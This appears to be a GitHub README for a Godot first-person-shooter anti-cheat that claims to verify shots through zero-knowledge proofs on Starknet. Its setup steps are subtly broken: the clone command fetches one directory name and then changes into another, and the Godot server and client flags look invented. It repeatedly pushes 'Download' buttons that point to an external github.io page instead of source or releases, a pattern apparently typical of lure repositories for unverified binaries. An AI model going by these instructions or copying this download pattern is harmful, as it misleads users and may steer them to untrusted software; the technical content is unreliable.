# ZK-Sniper / Obsidian Anti-Cheat - Anti-Cheat 2026

> **A first-person shooter anti-cheat built on Starknet that replaces kernel-level monitoring with zero-knowledge, on-chain physics checks while keeping player privacy intact.**

[![Platform](https://img.shields.io/badge/Platform-Godot-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-v1.0-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/taylorlucas63/obsidian-zk-anti-cheat?style=flat-square)](https://github.com/taylorlucas63/obsidian-zk-anti-cheat)

---

<p align="center">
  <a href="https://taylorlucas63.github.io/obsidian-zk-anti-cheat/">
    <img src="https://img.shields.io/badge/Download-ZK--Sniper%20Latest-brightgreen?style=for-the-badge" alt="Download ZK-Sniper">
  </a>
</p>

> **[Direct Download - ZK-Sniper / Obsidian Anti-Cheat v1.0](https://taylorlucas63.github.io/obsidian-zk-anti-cheat/)**

---

[Download Latest Build](https://taylorlucas63.github.io/obsidian-zk-anti-cheat/)

---

## Overview

ZK-Sniper / Obsidian Anti-Cheat takes a blockchain-first route to competitive game integrity. Rather than relying on kernel hooks or invasive system inspection, it checks player behavior through zero-knowledge proofs on Starknet. The core "Proof of Shot" mechanism is used to surface aimbots and wallhacks without exposing private player information.

This project is aimed at developers and competitive players who want fair matches without sacrificing privacy. It combines Cairo smart contracts with the Torii indexer to support efficient on-chain verification. Because the design stays in user space, it does not require elevated privileges and can sit alongside the game cleanly, which makes it a practical option for Godot-based FPS projects that need transparent, trustless validation.

## Capabilities

- **User-space operation** - No kernel-level access is needed, and the system stays out of privileged execution paths
- **Physics checks on-chain** - Game actions are validated against physical constraints through Starknet
- **Privacy-first verification** - Zero-knowledge proofs confirm behavior without revealing personal data
- **Cairo smart contracts** - Dedicated contracts implement proof generation and verification behavior
- **Torii indexer integration** - Game events are indexed and queried efficiently from chain data
- **Aimbot and wallhack detection** - Flags impossible aim behavior and shots through walls
- **Proof of Shot logic** - Verifies that shots are physically plausible based on position and weapon statistics
- **Godot engine compatible** - Intended for integration with Godot-based FPS games

## Installation

Clone the repository and move into the project directory:

```bash
git clone https://github.com/taylorlucas63/obsidian-zk-anti-cheat.git
cd ZK-Anti-Cheat
```

The Godot project does not need any extra build step. Open it in Godot Engine and launch the main scene. For Cairo contract deployment, refer to the instructions under `contracts/`.

## How to Use

1. Start the game from Godot Engine.
2. The anti-cheat initializes automatically when the game begins.
3. Player actions are checked against on-chain physics rules.
4. If behavior looks suspicious, a proof request is sent to Starknet.
5. Valid actions continue normally, while invalid ones are marked.

Example workflow:

```bash
# Start the game server
godot --server

# Connect a client
godot --client --address 127.0.0.1 --port 8080
```

## Settings

Configuration is kept in `config/anti_cheat_settings.json`. Important values include:

```json
{
  "proof_threshold": 0.95,
  "verification_timeout_ms": 2000,
  "starknet_rpc_url": "https://starknet-goerli.infura.io/v3/YOUR_KEY",
  "torii_endpoint": "https://torii.example.com/graphql"
}
```

Adjust these entries to tune verification strictness and network connection details.

## Requirements

- **Platform:** Godot Engine 4.x or later
- **Runtime:** Goerli or Sepolia Starknet testnet (mainnet for production)
- **Storage:** ~50 MB for game assets and contract ABIs
- **Network:** Internet connection for on-chain verification
- **Dependencies:** Cairo compiler v2.0+ for contract deployment

## FAQ

**Q: How is this different from standard anti-cheat software?**  
A: Instead of kernel-level monitoring, it uses Starknet zero-knowledge proofs to protect privacy while still catching cheats.

**Q: Will it slow the game down?**  
A: The impact is minimal because verification runs asynchronously and only activates on suspicious actions.

**Q: Can the verification thresholds be changed?**  
A: Yes. Update the `proof_threshold` field in the configuration file.

**Q: What is the process for updating the Cairo contracts?**  
A: Rebuild the contracts with the current Cairo version and deploy them again to Starknet.

**Q: Where can I get help?**  
A: Open a GitHub issue for bugs or feature requests.

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
